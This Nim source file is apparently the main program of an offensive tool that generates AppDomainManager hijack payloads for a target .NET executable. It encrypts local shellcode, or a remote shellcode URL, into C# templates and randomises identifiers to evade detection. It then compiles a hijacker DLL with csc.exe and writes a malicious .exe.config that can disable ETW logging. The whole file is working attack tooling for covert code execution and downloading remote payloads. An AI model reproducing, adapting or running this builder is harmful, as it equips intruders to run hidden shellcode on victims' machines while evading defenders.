#[
    Main binary for automation of AppDomain hijack payloads.
]#
import std/[os, uri, strformat, osproc, strutils]

import mustache
import therapist

import ./crypto

# The parser is specified as a tuple
let spec = (
    # Name is a positional argument, by virtue of being surrounded by < and >
    #name: newStringArg(@["<name>"], help="Person to greet"),
    target: newStringArg(@["-t", "--target-name"], required=true, help="Name of the target managed .exe to hijack."),
    hijackName: newStringArg(@["-n", "--hijack-name"], required=true, help="Name of the hijacker .dll."),
    shellcodeUrl: newStringArg(@["-u", "--url"], help="URL of the remote shellcode to run."),
    shellcodeFile: newStringArg(@["-f", "--file"], help="File containing the shellcode to embed."),
    outputDirectory: newDirArg(@["-o", "--output"], required=true, help="Full directory to write files to."),
    disableEtw: newBoolArg(@["-e", "--etw"], defaultVal=true, help="Disable ETW."),
    # --version will cause 0.1.0 to be printed
    version: newMessageArg(@["--version"], "1.0.0", help="Prints version"),
    # --help will cause a help message to be printed
    help: newHelpArg(@["-h", "--help"], help="Show help message"),
)
# `args` and `command` are included in tests but would normally be picked up from the commandline

when isMainModule:
    spec.parseOrQuit()
    # If a help message or version was requested or a parse error generated it would be printed
    # and then the parser would call `quit`. Getting past `parseOrQuit` implies we're ok.
    # `spec` has now been modified to reflect the supplied arguments

    # validate the target param contains an exe extension
    var (_, targetName, targetExt) = spec.target.value.splitFile()
    if targetExt == "": targetExt = "exe"
    let target = targetName.addFileExt(targetExt)

    # validate the hijack param contains a dll extension
    var (_, hijackName, hijackExt) = spec.hijackName.value.splitFile()
    if hijackExt == "": hijackExt = "dll"
    let hijack = hijackName.addFileExt(hijackExt)

    if not spec.shellcodeFile.seen and not spec.shellcodeUrl.seen:
        echo "Shellcode file or url required!"
        echo "exiting..."
        quit()
    
    if spec.shellcodeFile.seen and spec.shellcodeUrl.seen:
        echo "Cannot specify both shellcode file and url, pick one!"
        echo "exiting..."
        quit()

    if spec.shellcodeFile.seen:
        # handle the embedded shellcode case here
        if not fileExists(spec.shellcodeFile.value):
                echo "Shellcode file does not exist!"
                echo "exiting..."
                quit()
        
        try: # validate the uri 
            discard spec.shellcodeUrl.value.parseUri()
        except Exception as e:
            echo e.msg
            quit()
        
        let key = crypto.randString(32)
        let ivstring = crypto.randString(16)
        let iv = cast[ptr array[16, byte]](addr ivstring[0])[]
        
        # read and encrypte shellcode
        let fShellcode = open(spec.shellcodeFile.value)
        let bShellcode = cast[seq[byte]](fShellcode.readAll())
        let encShellcode = bShellcode.encryptBytes(key, iv).encode()
        fShellcode.close()
        
        # open config and hijack.cs file
        let fConfig = open(spec.outputDirectory.value / (target & ".config"), fmWrite)
        let hijackFileName = hijackName & ".cs"
        let fHijackCs = open(spec.outputDirectory.value / (hijackFileName), fmWrite)

        # Begin template work
        var c = newContext(searchDirs = @["templates"])
        # Our vars
        c["managerType"] = hijackName
        c["encShellcode"] = encShellcode
        c["key"] = key
        c["ivstring"] = ivstring
        # Randomized var, func, and class names
        c["class_Helper"] = randName()
        c["func_Run"] = randName()
        c["var_shellcodeString"] = randName()
        c["func_DecryptString"] = randName()
        c["var_codeBytes"] = randName()
        c["var_codeSize"] = randName()
        c["var_threadHandle"] = randName()
        c["var_ivstring"] = randName()
        c["var_ivarray"] = randName()
        c["var_keystring"] = randName()
        c["var_encryptionKey"] = randName()
        c["func_Decrypt"] = randName()
        c["var_encryptedText"] = randName()
        c["var_encryptedBytes"] = randName()
        c["func_DecryptBytes"] = randName()
        c["var_decryptor"] = randName()
        c["var_memoryStream"] = randName()
        c["var_cryptoStream"] = randName()
        c["var_decryptedBytes"] = randName()
        c["var_bytesRead"] = randName()
        c["var_input"] = randName()
        c["func_GetKeyFromString"] = randName()
        c["var_codePtr"] = randName()
        c["class_StringEncryption"] = randName()
        c["class_NativeMethods"] = randName()



        fHijackCs.write("{{ >hijacker-embedded-pic }}".render(c))
        fHijackCs.close()

        # Compile the CS
        var result: tuple[output: string, exitCode: int]
        let compileCmd = &"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:{spec.outputDirectory.value / hijack} {spec.outputDirectory.value / hijackFileName}"""
        result = execCmdEx(compileCmd)
        if result.exitCode != 0:
            echo "Compiliation of hijacker CS failed!"
            echo "command: ", compileCmd
            echo "output:\n", result.output
            echo "exiting..."
            quit()
        
        # Get the full assembly name w/ version and signing key token (if any)
        var pwshCmd = &"""powershell -c "$path = Join-Path (Get-Item {spec.outputDirectory.value}).Fullname '{hijack}';([system.reflection.assembly]::loadfile($path)).FullName" """
        echo "Running shell command: ", pwshCmd
        result = execCmdEx(pwshCmd)
        if result.exitCode != 0:
            echo "Powershell to get the assembly name failed!"
            echo "command: ", pwshCmd
            echo "output:\n", result.output
            echo "exiting..."
            quit()

        # Write the config
        c = newContext(searchDirs = @["templates"])
        c["managerAssemblyFullName"] = result.output.replace("\n", "")
        c["managerType"] = hijackName
        if spec.disableEtw.value:
            c["etwEnabled"] = "true"
        else:
            c["etwEnabled"] = "false"

        fConfig.write("{{ >config }}".render(c))
        fConfig.close()


    elif spec.shellcodeUrl.seen:
        # handle remote url shellcode option
        try: # validate the uri 
            discard spec.shellcodeUrl.value.parseUri()
        except Exception as e:
            echo e.msg
            quit()
        
        # open config and hijack.cs file
        let fConfig = open(spec.outputDirectory.value / (target & ".config"), fmWrite)
        let hijackFileName = hijackName & ".cs"
        let fHijackCs = open(spec.outputDirectory.value / (hijackFileName), fmWrite)

        let key = crypto.randString(32)
        let ivstring = crypto.randString(16)
        let iv = cast[ptr array[16, byte]](addr ivstring[0])[]
        
        let encUrl = toByteSeq(spec.shellcodeUrl.value).encryptBytes(key, iv).encode()

        # Begin template work
        var c = newContext(searchDirs = @["templates"])
        # Our vars
        c["managerType"] = hijackName
        c["encUrl"] = encUrl
        c["key"] = key
        c["ivstring"] = ivstring
        # Randomized var, func, and class names
        c["class_Helper"] = randName()
        c["func_Run"] = randName()
        c["var_codeUrl"] = randName()
        c["func_DecryptString"] = randName()
        c["var_codeBytes"] = randName()
        c["var_codeSize"] = randName()
        c["var_threadHandle"] = randName()
        c["func_DownloadData"] = randName()
        c["var_url"] = randName()
        c["var_client"] = randName()
        c["var_ivstring"] = randName()
        c["var_ivarray"] = randName()
        c["var_keystring"] = randName()
        c["var_encryptionKey"] = randName()
        c["func_DecryptString"] = randName()
        c["var_encryptedText"] = randName()
        c["var_encryptedBytes"] = randName()
        c["func_DecryptStringFromBytes"] = randName()
        c["var_decryptor"] = randName()
        c["var_memoryStream"] = randName()
        c["var_cryptoStream"] = randName()
        c["var_decryptedBytes"] = randName()
        c["var_bytesRead"] = randName()
        c["var_input"] = randName()
        c["func_GetKeyFromString"] = randName()
        c["var_codePtr"] = randName()
        c["class_StringEncryption"] = randName()
        c["class_NativeMethods"] = randName()



        fHijackCs.write("{{ >hijacker-remote-pic }}".render(c))
        fHijackCs.close()

        # Compile the CS
        var result: tuple[output: string, exitCode: int]
        let compileCmd = &"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:{spec.outputDirectory.value / hijack} {spec.outputDirectory.value / hijackFileName}"""
        result = execCmdEx(compileCmd)
        if result.exitCode != 0:
            echo "Compiliation of hijacker CS failed!"
            echo "command: ", compileCmd
            echo "output:\n", result.output
            echo "exiting..."
            quit()
        
        # Get the full assembly name w/ version and signing key token (if any)
        var pwshCmd = &"""powershell -c "$path = Join-Path (Get-Item {spec.outputDirectory.value}).Fullname '{hijack}';([system.reflection.assembly]::loadfile($path)).FullName" """
        echo "Running shell command: ", pwshCmd
        result = execCmdEx(pwshCmd)
        if result.exitCode != 0:
            echo "Powershell to get the assembly name failed!"
            echo "command: ", pwshCmd
            echo "output:\n", result.output
            echo "exiting..."
            quit()

        # Write the config
        c = newContext(searchDirs = @["templates"])
        c["managerAssemblyFullName"] = result.output.replace("\n", "")
        c["managerType"] = hijackName
        if spec.disableEtw.value:
            c["etwEnabled"] = "true"
        else:
            c["etwEnabled"] = "false"

        fConfig.write("{{ >config }}".render(c))
        fConfig.close()